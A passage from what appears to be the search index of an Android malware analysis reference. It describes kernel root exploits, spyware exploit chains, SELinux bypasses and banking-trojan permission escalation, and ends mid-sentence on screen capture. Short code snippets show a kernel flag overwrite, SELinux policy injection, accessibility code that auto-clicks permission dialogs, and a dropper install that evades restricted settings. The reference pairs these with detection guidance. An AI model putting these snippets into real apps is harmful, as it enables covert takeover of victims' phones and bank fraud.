Samsung Exynos kernel flaws and misconfigured <code>setuid</code> binaries. Named its exploits after Lord of the Rings characters (Gandalf, Boromir, Pippin), each targeting a different kernel vulnerability. Originally distributed as a legitimate rooting utility, Framaroot's exploit binaries were later embedded directly into malware. The Pegasus Android variant (Chrysaor) reused Framaroot exploits for initial privilege escalation on older Samsung devices, as documented by Lookout in 2017.</p>"},{"location":"attacks/privilege-escalation/#towelroot-cve-2014-3153","title":"Towelroot -- CVE-2014-3153","text":"<p>Race condition in the Linux kernel <code>futex</code> subsystem discovered by George Hotz (GeoHot). The vulnerability allowed an unprivileged process to escalate to root through a <code>futex_requeue</code> race. Affected every Android device running kernel versions before 3.14.5. The Pegasus Android variant used Towelroot as one of several exploits in its escalation chain. Google's analysis of Chrysaor confirmed Towelroot was the primary root vector on devices where Framaroot failed.</p>"},{"location":"attacks/privilege-escalation/#dirtycow-cve-2016-5195","title":"DirtyCow -- CVE-2016-5195","text":"<p>Copy-on-write race condition in the Linux kernel's memory subsystem, present since kernel 2.6.22 (2007). The bug allowed a local attacker to gain write access to read-only memory mappings by racing <code>madvise(MADV_DONTNEED)</code> against page fault handling. On Android, this translated to overwriting <code>setuid</code> binaries or directly patching the running kernel in memory. DirtyCow was widely exploited in the wild and became one of the most reliable Android root exploits ever discovered. ZNIU malware was the first family observed exploiting DirtyCow on Android at scale, targeting over 40 countries in 2017.</p>"},{"location":"attacks/privilege-escalation/#mediatek-su-cve-2020-0069","title":"MediaTek-SU -- CVE-2020-0069","text":"<p>Command injection in MediaTek's <code>CMDQ</code> driver that allowed any app to execute commands as root. Affected millions of devices across dozens of OEMs using MediaTek chipsets (including Amazon Fire tablets). The vulnerability was publicly disclosed by XDA Developers after being used in the rooting community for months, and was exploited by multiple malware campaigns targeting budget MediaTek phones in Southeast Asia and Africa. MediaTek patched it in March 2020, but OEM patch distribution for low-end devices was slow to nonexistent.</p>"},{"location":"attacks/privilege-escalation/#dirtypipe-cve-2022-0847","title":"DirtyPipe -- CVE-2022-0847","text":"<p>Flaw in the Linux kernel pipe buffer implementation that allowed overwriting data in arbitrary read-only files by manipulating page cache references through the <code>splice()</code> system call. Affected kernel versions 5.8 through 5.16.11. On Android, this impacted devices running Android 12 with kernel 5.10, including Pixel 6 and Samsung Galaxy S22. Google patched it in the Android Security Bulletin for March 2022. Some spyware vendors reportedly integrated DirtyPipe into their exploit chains during the window between public disclosure and patch deployment.</p>"},{"location":"attacks/privilege-escalation/#kingroot-and-kingoroot","title":"KingRoot and KingoRoot","text":"<p>Commercial one-click rooting tools that bundled dozens of kernel exploits covering hundreds of device/kernel combinations. Both tools ship as closed-source APKs that phone home to Chinese servers, download device-specific exploit payloads, and attempt multiple root strategies sequentially. Malware authors repurpose the exploit binaries extracted from these tools rather than developing their own. Lookout research documented adware campaigns using KingRoot's exploit modules to silently root devices and install system-level adware that survives factory resets.</p>"},{"location":"attacks/privilege-escalation/#kernel-exploits-by-commercial-spyware","title":"Kernel Exploits by Commercial Spyware","text":"<p>Commercial spyware operates at a different tier than commodity malware. These vendors maintain dedicated exploit development teams that target zero-day vulnerabilities in the Android kernel, GPU drivers, and baseband processors. The exploits are chained together -- typically a sandbox escape, a kernel privilege escalation, and a SELinux bypass -- to achieve persistent, undetectable implant installation.</p>"},{"location":"attacks/privilege-escalation/#pegasus-nso-group","title":"Pegasus -- NSO Group","text":"<p>The most documented commercial spyware on Android. The Android variant, codenamed Chrysaor by Google, was first analyzed by Lookout and Google in April 2017. Early versions used known exploits (Framaroot, Towelroot) as a fallback when zero-days failed. Later versions shifted entirely to zero-day chains. Pegasus's Android capabilities include live call recording, camera/microphone access, message extraction from encrypted apps, and GPS tracking -- all requiring kernel-level access to bypass Android's sandbox. The Amnesty International Pegasus Project (2021) documented its deployment against journalists and activists globally.</p>"},{"location":"attacks/privilege-escalation/#predator-cytroxintellexa","title":"Predator -- Cytrox/Intellexa","text":"<p>Google TAG and Cisco Talos jointly documented a 5-exploit chain used by Predator in 2022-2023. The chain targeted Chrome, the Android kernel, and specific Qualcomm/ARM GPU drivers. Predator was delivered via one-click links sent through messaging apps. Once initial code execution was achieved through a Chrome renderer bug, the chain escalated through a sandbox escape, then a kernel exploit for full device compromise. Cisco Talos's deep technical analysis revealed Predator's modular loader architecture and its use of Python-based implant modules running with root privileges.</p>"},{"location":"attacks/privilege-escalation/#hermit-rcs-lab","title":"Hermit -- RCS Lab","text":"<p>Italian spyware documented by Lookout in June 2022 and confirmed by Google TAG. Hermit's delivery was notable: ISP-level cooperation was used to disable the target's mobile data, then an SMS was sent impersonating the carrier and directing the victim to install a \"connectivity fix\" app. The app contained exploit chains targeting the Android kernel. Google identified victims in Italy and Kazakhstan.</p>"},{"location":"attacks/privilege-escalation/#novispy","title":"NoviSpy","text":"<p>Serbian police spyware documented by Amnesty International in December 2024. NoviSpy was installed on journalists' and activists' devices during police custody using Cellebrite UFED for initial device unlock, then deployed a spyware implant that exploited Qualcomm zero-day vulnerabilities including CVE-2024-43047 (a use-after-free in Qualcomm's DSP driver). The implant gained kernel access, bypassed SELinux, and established persistent surveillance. This case is significant because it documented the intersection of lawful access tools (Cellebrite) and spyware deployment in a single attack chain.</p>"},{"location":"attacks/privilege-escalation/#quadream-reign","title":"QuaDream REIGN","text":"<p>Parallel competitor to NSO Group, documented by Citizen Lab and Microsoft in April 2023. Primarily known for iOS zero-click exploits, but the company marketed Android capabilities to government clients. QuaDream shut down in 2023, reportedly due to business difficulties after public exposure. The Android component's technical details remain less documented than the iOS variant.</p>"},{"location":"attacks/privilege-escalation/#zero-click-exploits-on-android","title":"Zero-Click Exploits on Android","text":"<p>Zero-click exploits require no user interaction. The attacker sends a specially crafted message, network packet, or Bluetooth signal that triggers code execution in a background process. These are the highest-value exploits because they leave no social engineering trail.</p>"},{"location":"attacks/privilege-escalation/#samsung-exynos-baseband-rce-2023","title":"Samsung Exynos Baseband RCE (2023)","text":"<p>Google Project Zero's Natalie Silvanovich disclosed 18 vulnerabilities in Samsung's Exynos modem firmware in March 2023. Four of these (CVE-2023-24033, CVE-2023-26496, CVE-2023-26497, CVE-2023-26498) allowed remote code execution in the baseband processor with only the victim's phone number. The attacker could send a specially crafted SIP INVITE or other VoLTE/VoWiFi packet that triggered a buffer overflow in the baseband's protocol parsing code. Affected chipsets included Exynos 980, 1080, 1280, 2200, and Exynos Modem 5123/5300 -- present in Samsung Galaxy S22, A53, Pixel 6, Pixel 7, and various Vivo devices. Baseband RCE is particularly dangerous because the baseband processor operates outside Android's security model entirely: no SELinux, no app sandbox, direct access to cellular communications.</p>"},{"location":"attacks/privilege-escalation/#cve-2023-40088-bluetooth-zero-click-rce","title":"CVE-2023-40088 -- Bluetooth Zero-Click RCE","text":"<p>Memory corruption in Android's Bluetooth stack (<code>com_android_bluetooth_btservice_AdapterService.cpp</code>) patched in December 2023. Exploitation required Bluetooth to be enabled and the attacker to be within Bluetooth range. No pairing or user interaction needed. The bug allowed remote code execution in the Bluetooth service process, which runs with elevated privileges. Combined with a second-stage kernel exploit, this could achieve full device compromise from physical proximity alone.</p>"},{"location":"attacks/privilege-escalation/#landfall-2024","title":"LANDFALL (2024)","text":"<p>Samsung-specific zero-click exploit chain reported by Google TAG in 2024. Details remain partially restricted due to ongoing patching, but the chain targeted Samsung's RCS message processing and achieved code execution without any user interaction. Attributed to a commercial spyware vendor. The exploit leveraged vulnerabilities in Samsung's Messages app (the default RCS client on Galaxy devices), which processes rich media content automatically upon receipt.</p>"},{"location":"attacks/privilege-escalation/#rich-communication-services-rcs-attack-surface","title":"Rich Communication Services (RCS) Attack Surface","text":"<p>RCS replaces SMS with a richer protocol supporting read receipts, group chats, and media. The expanded functionality introduces a larger attack surface. RCS clients automatically process incoming messages including media previews, vCards, and location data. Vulnerabilities in media parsing (image codecs, video decoders, PDF renderers) within the RCS client can be triggered by sending a crafted message. Google Messages and Samsung Messages both handle RCS processing in the background, making them prime zero-click targets.</p>"},{"location":"attacks/privilege-escalation/#selinux-bypass","title":"SELinux Bypass","text":"<p>Modern Android devices run SELinux in enforcing mode. Even with a kernel exploit granting uid 0, the attacker's process remains confined by SELinux policy. Commercial spyware must bypass or disable SELinux to operate freely. See the dedicated SELinux page for the platform's design and enforcement details.</p>"},{"location":"attacks/privilege-escalation/#nulling-selinux_enforcing","title":"Nulling selinux_enforcing","text":"<p>The most direct approach. The attacker uses a kernel write primitive to set the <code>selinux_enforcing</code> global variable to 0, switching SELinux from enforcing to permissive mode. On older kernels (pre-4.17), this variable was a simple integer in kernel memory. The exploit locates it via <code>/proc/kallsyms</code> (if readable) or through known offsets for the target kernel build, then overwrites it.</p> <pre><code>unsigned long enforcing_addr = find_symbol(\"selinux_enforcing\");\n*(int *)enforcing_addr = 0;\n</code></pre> <p>Modern kernels compile with <code>CONFIG_KALLSYMS_ALL=n</code> and restrict <code>/proc/kallsyms</code> access, making symbol resolution harder but not impossible -- the attacker can scan kernel memory for known patterns.</p>"},{"location":"attacks/privilege-escalation/#removing-security-hook-heads","title":"Removing Security Hook Heads","text":"<p>A more surgical approach that disables specific SELinux hooks without changing the enforcing flag (which is monitored by some integrity checking systems). The Linux Security Module (LSM) framework uses a linked list of <code>security_hook_heads</code>. The attacker patches the function pointers in the hook list to point to no-op functions, effectively neutering individual permission checks (file access, process creation, socket operations) while leaving SELinux nominally in enforcing mode.</p>"},{"location":"attacks/privilege-escalation/#selinux-policy-injection","title":"SELinux Policy Injection","text":"<p>On rooted devices, the attacker can load custom SELinux policies using <code>semodule</code> or by directly writing to <code>/sys/fs/selinux/load</code>. This adds <code>allow</code> rules for the attacker's process domain without disabling enforcement for other domains. Tools like <code>sepolicy-inject</code> and <code>magiskpolicy</code> (from the Magisk project) automate this process.</p> <pre><code>magiskpolicy --live \"allow untrusted_app system_data_file file { read write open create }\"\n</code></pre>"},{"location":"attacks/privilege-escalation/#pegasus-selinux-bypass","title":"Pegasus SELinux Bypass","text":"<p>Pegasus (Chrysaor) used a multi-stage SELinux bypass. After gaining root via kernel exploit, it checked the SELinux status. If enforcing, it exploited a known vulnerability in the kernel's SELinux implementation or used the kernel write primitive to patch the enforcement flag. It then relabeled its own process context to a privileged domain (<code>init</code> or <code>system_server</code>) to operate with full access to all protected resources. Later versions used more sophisticated techniques including runtime policy modification to add targeted allow rules rather than disabling enforcement entirely.</p>"},{"location":"attacks/privilege-escalation/#system-app-impersonation","title":"System App Impersonation","text":""},{"location":"attacks/privilege-escalation/#leaked-platform-signing-certificates","title":"Leaked Platform Signing Certificates","text":"<p>In December 2022, Google security researcher Lukasz Siewierski disclosed that platform signing certificates from Samsung, LG, MediaTek, and other OEMs had been leaked and were being used to sign malware. An APK signed with a platform certificate gets the <code>android.uid.system</code> shared UID, granting it the same privileges as the core system -- access to all protected APIs, all permissions auto-granted, ability to interact with system services without restriction.</p> <p>The leaked certificates affected:</p> OEM Certificate Serial Impact Samsung Various platform certs Malware could run as system on Samsung devices LG Platform signing key leaked System-level access on LG devices MediaTek Platform cert included in SDK leaks Widely used in budget device malware Revoview Platform cert Limited device impact"},{"location":"attacks/privilege-escalation/#shareduserid-exploitation","title":"SharedUserId Exploitation","text":"<p>An APK declaring <code>android:sharedUserId=\"android.uid.system\"</code> in its manifest and signed with the platform certificate runs in the system process's UID. This gives it:</p> <ul> <li>All signature-level permissions without declaration</li> <li>Write access to <code>/data/system/</code> and other protected directories</li> <li>Ability to bind to system services as a privileged caller</li> <li>Access to <code>Settings.Secure</code> and <code>Settings.Global</code> for direct modification</li> </ul> <pre><code>&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    android:sharedUserId=\"android.uid.system\"&gt;\n</code></pre>"},{"location":"attacks/privilege-escalation/#triada-supply-chain-abuse","title":"Triada Supply-Chain Abuse","text":"<p>Triada represents the most sophisticated system app impersonation observed in the wild. Rather than exploiting leaked certificates post-manufacture, Triada was pre-installed at the firmware level during the manufacturing process of budget Android devices. The malware was injected into the system image itself, running as a system app with full platform privileges from first boot. Google's investigation revealed that a supply-chain compromise at an ODM (original design manufacturer) allowed the malware to be embedded into the firmware of multiple device brands. Over 40 device models were confirmed affected.</p>"},{"location":"attacks/privilege-escalation/#permission-escalation-chains","title":"Permission Escalation Chains","text":"<p>Not all privilege escalation requires exploiting vulnerabilities. On Android, a single permission can be chained into progressively greater control through the framework's own APIs. These chains exploit the trust model: once the user grants one sensitive permission, the malware uses it to acquire others without further user consent.</p>"},{"location":"attacks/privilege-escalation/#the-overlay-to-accessibility-chain","title":"The Overlay-to-Accessibility Chain","text":"<p>The most common escalation path used by banking trojans:</p> <ol> <li>App requests <code>SYSTEM_ALERT_WINDOW</code> (auto-granted for Play Store installs on Android 6-9, or via Settings toggle)</li> <li>Overlay covers the screen with a fake dialog or tutorial</li> <li>Overlay guides/tricks the user into enabling accessibility service</li> <li>Accessibility service auto-grants all remaining runtime permissions by navigating Settings</li> <li>Full device control achieved: keylogging, screen reading, gesture injection, notification interception</li> </ol> <p>This chain converts a single, relatively easy-to-obtain permission into total device control through social engineering and UI manipulation.</p>"},{"location":"attacks/privilege-escalation/#accessibility-as-the-master-permission","title":"Accessibility as the Master Permission","text":"<p>Once an accessibility service is active, it can programmatically grant every other permission the malware needs:</p> Permission How Accessibility Grants It Runtime permissions (camera, mic, location, SMS, etc.) Navigates to Settings &gt; Apps &gt; Permissions, clicks \"Allow\" Device admin Clicks \"Activate\" on the device admin prompt Notification listener Toggles the switch in Settings &gt; Notification access Default SMS app Navigates Settings &gt; Default apps &gt; SMS, selects the malware Install unknown apps Enables \"Allow from this source\" in Settings Battery optimization exemption Navigates to battery settings, disables optimization <p>This is why accessibility is the single most dangerous permission on Android. Every other permission becomes obtainable once accessibility is compromised.</p>"},{"location":"attacks/privilege-escalation/#device-admin-escalation","title":"Device Admin Escalation","text":"<p>From device admin activation:</p> <ol> <li><code>lockNow()</code> locks the screen, forcing PIN/pattern entry</li> <li>Overlay or accessibility captures the PIN during unlock</li> <li><code>resetPassword()</code> (pre-Android 7) changes the lock credential</li> <li><code>wipeData()</code> used as ransomware or anti-forensics threat</li> <li>Camera disable and other policies used as leverage</li> </ol>"},{"location":"attacks/privilege-escalation/#notification-listener-to-account-takeover","title":"Notification Listener to Account Takeover","text":"<p>From notification listener access:</p> <ol> <li>Intercept incoming SMS/push notifications containing OTPs</li> <li>Suppress the notification so the user never sees it</li> <li>Forward the OTP to C2 for real-time use</li> <li>Attacker uses stolen credentials + OTP to take over banking/email accounts</li> <li>Account takeover enables further attacks (SIM swap, credential resets)</li> </ol>"},{"location":"attacks/privilege-escalation/#android-version-timeline","title":"Android Version Timeline","text":"Version Year Escalation-Relevant Changes Android 4.3 2013 SELinux introduced in permissive mode Android 4.4 2013 SELinux enforcing for core domains; <code>su</code> binary restricted Android 5.0 2014 Full SELinux enforcement; 64-bit ABI; verified boot (warning only) Android 6.0 2015 Runtime permissions model; <code>SYSTEM_ALERT_WINDOW</code> auto-granted from Play Store Android 7.0 2016 Verified boot strictly enforced; file-based encryption; <code>resetPassword()</code> restricted Android 8.0 2017 Project Treble (HAL isolation); <code>SYSTEM_ALERT_WINDOW</code> type restrictions; seccomp filter for zygote Android 9.0 2018 Biometric API; device admin deprecated for third-party apps; kernel CFI on Pixel Android 10 2019 Scoped storage; background activity launch restrictions; BoundsSanitizer in media codecs Android 11 2020 One-time permissions; scoped storage enforced; <code>MANAGE_EXTERNAL_STORAGE</code> gated; async <code>binder</code> calls restricted Android 12 2021 Approximate location option; <code>SameSite</code> cookies in WebView; ART module updatable via Play Android 13 2022 Restricted settings for sideloaded apps (blocks accessibility/notification listener); notification permission required; intent filter matching stricter Android 14 2023 Minimum target SDK enforced (blocks installing very old APKs); credential manager API; background activity launch further restricted Android 15 2024 Expanded restricted settings; improved integrity checking; 16KB page size support reducing exploit reliability"},{"location":"attacks/privilege-escalation/#families-using-this-technique","title":"Families Using This Technique","text":"Family Escalation Method Details Pegasus Zero-day kernel exploits, SELinux bypass Full exploit chain: sandbox escape + kernel root + SELinux disable. Framaroot/Towelroot as fallback Predator 5-exploit chain (Chrome + kernel + GPU driver) Delivered via one-click links, exploits Chrome renderer then escalates Hermit Kernel exploits with ISP-level delivery ISP cooperation for delivery, exploit chain for root Triada Supply-chain firmware injection Pre-installed as system app, runs with platform certificate FinSpy DirtyCow and other kernel exploits Government spyware, maintained private exploit library ZNIU DirtyCow (CVE-2016-5195) First malware to exploit DirtyCow on Android at scale Anatsa Overlay -&gt; accessibility -&gt; permission auto-grant Classic permission chain for banking fraud Hook Accessibility -&gt; full device control + VNC Permission chain with remote access Octo Accessibility -&gt; screen streaming -&gt; ATS Permission chain for on-device fraud Cerberus Overlay + accessibility + device admin Triple escalation for persistence and fraud GodFather Overlay -&gt; accessibility -&gt; auto-grant Permission chain targeting banking apps Xenomorph Accessibility -&gt; ATS with auto-permission grant Automated permission escalation for on-device fraud Chameleon Accessibility -&gt; runtime permission manipulation Bypasses Android 13 restricted settings NoviSpy Qualcomm zero-day (CVE-2024-43047) Physical access deployment with Cellebrite + kernel exploit"},{"location":"attacks/privilege-escalation/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li>Native libraries (<code>.so</code> files) containing known exploit strings (<code>towelroot</code>, <code>dirtycow</code>, <code>dirty_pipe</code>, <code>CMDQ</code>)</li> <li>ELF binaries in <code>assets/</code> or <code>lib/</code> directories not matching expected app functionality</li> <li><code>sharedUserId=\"android.uid.system\"</code> in AndroidManifest.xml</li> <li>APK signed with known leaked platform certificates (compare against Google's APVI database)</li> <li>References to <code>/proc/kallsyms</code>, <code>/dev/kmem</code>, <code>selinux_enforcing</code>, or <code>/sys/fs/selinux/enforce</code> in native code</li> <li><code>DexClassLoader</code> or <code>Runtime.exec()</code> loading binaries from writable directories</li> <li>Requests for <code>SYSTEM_ALERT_WINDOW</code> + <code>BIND_ACCESSIBILITY_SERVICE</code> + <code>BIND_DEVICE_ADMIN</code> in the same manifest (permission chain setup)</li> </ul> Dynamic Indicators <ul> <li>Process UID changing from app UID to 0 (root) during execution</li> <li>SELinux mode switching from enforcing to permissive (<code>getenforce</code> returns <code>Permissive</code>)</li> <li>New files appearing in <code>/system/</code>, <code>/data/local/tmp/</code>, or <code>/data/data/&lt;pkg&gt;/</code> with root ownership</li> <li><code>su</code> binary being written or executed</li> <li>Kernel log (<code>dmesg</code>) showing SELinux denials followed by sudden silence (enforcement disabled)</li> <li>Accessibility service enabling itself through UI automation sequences visible in <code>dumpsys accessibility</code></li> <li>Sequential Settings navigation captured in accessibility event logs (permission auto-granting behavior)</li> <li>Process context labels changing in <code>/proc/&lt;pid&gt;/attr/current</code> (SELinux domain transition)</li> </ul> Frida: Detect Root Escalation Attempts <pre><code>Java.perform(function() {\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exec.overload(\"[Ljava.lang.String;\").implementation = function(cmd) {\n        var cmdStr = cmd.join(\" \");\n        if (cmdStr.indexOf(\"su\") !== -1 || cmdStr.indexOf(\"/system/\") !== -1) {\n            console.log(\"[*] Suspicious exec: \" + cmdStr);\n            console.log(Java.use(\"android.util.Log\").getStackTraceString(\n                Java.use(\"java.lang.Exception\").$new()\n            ));\n        }\n        return this.exec(cmd);\n    };\n\n    var System = Java.use(\"java.lang.System\");\n    System.load.implementation = function(lib) {\n        console.log(\"[*] System.load: \" + lib);\n        return this.load(lib);\n    };\n\n    System.loadLibrary.implementation = function(lib) {\n        console.log(\"[*] System.loadLibrary: \" + lib);\n        return this.loadLibrary(lib);\n    };\n});\n</code></pre>"},{"location":"attacks/runtime-permission-manipulation/","title":"Runtime Permission Manipulation","text":"<p>Granting permissions without user interaction. Once malware obtains <code>BIND_ACCESSIBILITY_SERVICE</code>, it can navigate Settings screens, tap \"Allow\" buttons, and toggle switches to escalate from a single permission to full device control. Every modern Android banking trojan uses some variant of this technique.</p> <p>Requirements</p> Requirement Details Permission <code>BIND_ACCESSIBILITY_SERVICE</code> (user must enable manually) Trigger Initial social engineering to enable accessibility <p>The only user interaction needed is enabling the accessibility service. Everything after that is automated.</p>"},{"location":"attacks/runtime-permission-manipulation/#accessibility-based-auto-grant","title":"Accessibility-Based Auto-Grant","text":"<p>The core technique: the malware's accessibility service programmatically navigates system Settings and interacts with UI elements to grant itself additional permissions.</p>"},{"location":"attacks/runtime-permission-manipulation/#view-tree-navigation","title":"View Tree Navigation","text":"<p>The accessibility service calls <code>getRootInActiveWindow()</code> to obtain the root <code>AccessibilityNodeInfo</code> of the current screen, then traverses the view tree searching for specific text labels or resource IDs matching permission toggles.</p> <pre><code>AccessibilityNodeInfo root = getRootInActiveWindow();\nList&lt;AccessibilityNodeInfo&gt; nodes = root.findAccessibilityNodeInfosByText(\"Allow\");\nfor (AccessibilityNodeInfo node : nodes) {\n    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);\n}\n</code></pre>"},{"location":"attacks/runtime-permission-manipulation/#settings-navigation-flow","title":"Settings Navigation Flow","text":"<p>The malware opens specific Settings screens via intents, then uses accessibility to manipulate them:</p> Permission Target Intent Action UI Interaction Overlay (<code>SYSTEM_ALERT_WINDOW</code>) <code>Settings.ACTION_MANAGE_OVERLAY_PERMISSION</code> Toggle switch to ON Install unknown apps <code>Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES</code> Toggle switch to ON Notification access <code>Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS</code> Toggle switch to ON Battery optimization <code>Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS</code> Select app, tap \"Allow\" Default SMS app <code>Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT</code> Select malware app Device admin <code>Settings.ACTION_ADD_DEVICE_ADMIN</code> Tap \"Activate\""},{"location":"attacks/runtime-permission-manipulation/#runtime-permission-dialogs","title":"Runtime Permission Dialogs","text":"<p>For standard runtime permissions (camera, contacts, location, SMS), the malware triggers the system permission dialog and immediately clicks \"Allow\" via accessibility before the user can react.</p> <pre><code>@Override\npublic void onAccessibilityEvent(AccessibilityEvent event) {\n    if (event.getPackageName().equals(\"com.google.android.packageinstaller\") ||\n        event.getPackageName().equals(\"com.android.permissioncontroller\")) {\n        AccessibilityNodeInfo root = getRootInActiveWindow();\n        List&lt;AccessibilityNodeInfo&gt; allowButtons =\n            root.findAccessibilityNodeInfosByViewId(\n                \"com.android.permissioncontroller:id/permission_allow_button\");\n        if (!allowButtons.isEmpty()) {\n            allowButtons.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);\n        }\n    }\n}\n</code></pre> <p>The malware monitors for the <code>com.android.permissioncontroller</code> package in <code>TYPE_WINDOW_STATE_CHANGED</code> events, then locates and clicks the \"Allow\" button. On some Android versions, the button IDs differ (<code>permission_allow_foreground_only_button</code>, <code>permission_allow_always_button</code>), so families like ERMAC and Hook enumerate multiple possible IDs.</p>"},{"location":"attacks/runtime-permission-manipulation/#default-sms-app-exploitation","title":"Default SMS App Exploitation","text":"<p>Android grants <code>READ_SMS</code>, <code>RECEIVE_SMS</code>, <code>SEND_SMS</code>, and <code>RECEIVE_MMS</code> automatically to whichever app the user designates as the default SMS handler. Malware exploits this by requesting default SMS status:</p> <ol> <li>Launch <code>Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT</code> with its own package</li> <li>Use accessibility to tap \"Yes\" on the confirmation dialog</li> <li>Receive all SMS permissions automatically without individual grants</li> <li>Intercept OTPs and bank verification codes</li> <li>Optionally revert to the original SMS app after capturing needed data</li> </ol> <p>Families including Cerberus, Anubis, and FluBot use this approach to gain SMS access without triggering individual permission prompts.</p>"},{"location":"attacks/runtime-permission-manipulation/#session-based-installer-bypass-android-13","title":"Session-Based Installer Bypass (Android 13+)","text":"<p>Android 13 introduced \"Restricted Settings\" to block sideloaded apps from enabling accessibility services and notification listeners. Apps installed via <code>ACTION_VIEW</code> (the standard sideload path) are flagged as restricted. However, apps installed via <code>PackageInstaller</code> session-based API are treated as marketplace-installed and exempt.</p>"},{"location":"attacks/runtime-permission-manipulation/#how-droppers-exploit-this","title":"How Droppers Exploit This","text":"<p>The dropper app uses the session-based installation API to install its payload, mimicking how legitimate app stores install apps:</p> <pre><code>PackageInstaller installer = getPackageManager().getPackageInstaller();\nPackageInstaller.SessionParams params =\n    new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_SET_INSTALL);\nint sessionId = installer.createSession(params);\nPackageInstaller.Session session = installer.openSession(sessionId);\n\nOutputStream out = session.openWrite(\"payload\", 0, -1);\nInputStream in = getAssets().open(\"payload.apk\");\nbyte[] buffer = new byte[65536];\nint len;\nwhile ((len = in.read(buffer)) != -1) {\n    out.write(buffer, 0, len);\n}\nsession.fsync(out);\nout.close();\n\nIntent intent = new Intent(this, InstallReceiver.class);\nPendingIntent pending = PendingIntent.getBroadcast(this, sessionId, intent,\n    PendingIntent.FLAG_MUTABLE);\nsession.commit(pending.getIntentSender());\n</code></pre> <p>The OS cannot distinguish between a dropper using this API and a legitimate marketplace. The payload installs without the \"Restricted Settings\" flag, and the user can enable accessibility services normally.</p>"},{"location":"attacks/runtime-permission-manipulation/#notable-droppers","title":"Notable Droppers","text":"<p>ThreatFabric documented SecuriDropper in October 2023 as the first dropper-as-a-service using this technique. Since then, it has become standard practice across the MaaS ecosystem.</p> Dropper / Family Year Notes BugDrop 2022 Early proof-of-concept before Android 13 release SecuriDropper 2023 First DaaS offering session-based bypass SpyNote 2024 Adopted session-based installation for accessibility bypass Anatsa 2024 Play Store droppers with session-based payload delivery Medusa 2024 Updated dropper chain using session-based install <p>Android 14 and 15</p> <p>Android 14 did not fix this bypass. The same session-based technique works. Android 15 expanded restricted settings enforcement but still struggles to differentiate legitimate session-based installs from malicious ones.</p>"},{"location":"attacks/runtime-permission-manipulation/#biometric-downgrade-to-pin","title":"Biometric Downgrade to PIN","text":"<p>Chameleon introduced a technique in late 2023 to force the device from biometric authentication to PIN entry. The C2 sends an <code>interrupt_biometric</code> command, and the malware uses accessibility to:</p> <ol> <li>Navigate to Settings &gt; Security &gt; Biometric</li> <li>Disable fingerprint and face unlock</li> <li>Force the device to fall back to PIN/password authentication</li> <li>Capture the PIN via keylogging when the user next unlocks</li> </ol> <p>This works because disabling biometrics is a Settings toggle, accessible via the same accessibility-based UI manipulation used for permission grants. See also: Fake Biometric Prompts for overlay-based PIN capture.</p>"},{"location":"attacks/runtime-permission-manipulation/#family-comparison","title":"Family Comparison","text":"Family Auto-Grant SMS Takeover Session Install Biometric Downgrade Restricted Settings Bypass Cerberus Yes Yes (default SMS) No (pre-dates it) No N/A ERMAC Yes Via accessibility No No Via dropper Hook Yes Via accessibility Yes No Yes Medusa Yes Broadcast receiver Yes No Yes Anatsa Yes No (ATS-focused) Yes No Yes Xenomorph Yes Via accessibility No No Via dropper Chameleon Yes No Yes (Zombinder) Yes Yes SpyNote Yes Via accessibility Yes No Yes"},{"location":"attacks/runtime-permission-manipulation/#android-version-timeline","title":"Android Version Timeline","text":"Version Change Malware Adaptation Android 6 Runtime permissions introduced Malware auto-clicks \"Allow\" via accessibility Android 8 <code>TYPE_APPLICATION_OVERLAY</code> replaces <code>TYPE_SYSTEM_ALERT</code> Accessibility grants the new overlay permission Android 10 Background activity launch restrictions Foreground service workaround Android 11 Auto-revoke unused permissions Malware periodically re-grants via accessibility Android 11 One-time permissions for camera/mic/location Auto-grant repeats each session Android 12 Approximate vs precise location choice Accessibility selects \"Precise\" option Android 13 Restricted settings for sideloaded apps Session-based installer bypass Android 13 Notification permission now requires explicit grant Auto-clicked via accessibility Android 14 Restricted settings expanded but session bypass persists No change in dropper behavior Android 15 Expanded restricted settings enforcement Session-based bypass partially patched"},{"location":"attacks/runtime-permission-manipulation/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>BIND_ACCESSIBILITY_SERVICE</code> in manifest</li> <li><code>findAccessibilityNodeInfosByText</code> or <code>findAccessibilityNodeInfosByViewId</code> in decompiled code</li> <li>References to <code>com.android.permissioncontroller</code> or <code>com.google.android.packageinstaller</code></li> <li><code>PackageInstaller.Session</code> usage in dropper components</li> <li>Intent actions targeting Settings screens (<code>ACTION_MANAGE_OVERLAY_PERMISSION</code>, etc.)</li> </ul> Dynamic Indicators <ul> <li>Rapid succession of permission grants after accessibility is enabled</li> <li>Settings app opened programmatically without user navigation</li> <li>Default SMS app changed immediately after accessibility grant</li> <li>Permission dialogs appearing and disappearing within milliseconds</li> </ul>"},{"location":"attacks/runtime-permission-manipulation/#cross-references","title":"Cross-References","text":"<ul> <li>Accessibility Abuse -- the enabling technique for all permission manipulation</li> <li><code>BIND_ACCESSIBILITY_SERVICE</code> -- permission details and grant flow</li> <li>Overlay Attacks -- often enabled by auto-granted <code>SYSTEM_ALERT_WINDOW</code></li> <li>SMS Interception -- downstream abuse after SMS permissions are obtained</li> <li>Fake Biometric Prompts -- alternative PIN capture via overlay rather than biometric downgrade</li> </ul>"},{"location":"attacks/screen-capture/","title":"Screen Recording &amp; MediaProjection Abuse","text":"<p>Capturing the victim's screen in real time to steal credentials, monitor activity, or enable remote device control. Unlike overlay attacks that present fake UI, screen capture techniques passively observe the real UI -- the victim interacts with their actual banking app while the attacker watches or records every frame.</p> <p>See also: Camera &amp; Mic Surveillance, Notification Suppression</p> <p>Requirements</p> Requirement Details Permission <code>FOREGROUND_SERVICE</code> + <code>FOREGROUND_SERVICE_MEDIA_PROJECTION</code> (Android 10+), or <code>BIND_ACCESSIBILITY_SERVICE</code> User Interaction MediaProjection consent dialog (one-time tap), or accessibility service enablement Infrastructure C2 server or WebSocket endpoint for live streaming"},{"location":"attacks/screen-capture/#techniques","title":"Techniques","text":""},{"location":"attacks/screen-capture/#mediaprojection-api","title":"MediaProjection API","text":"<p>The 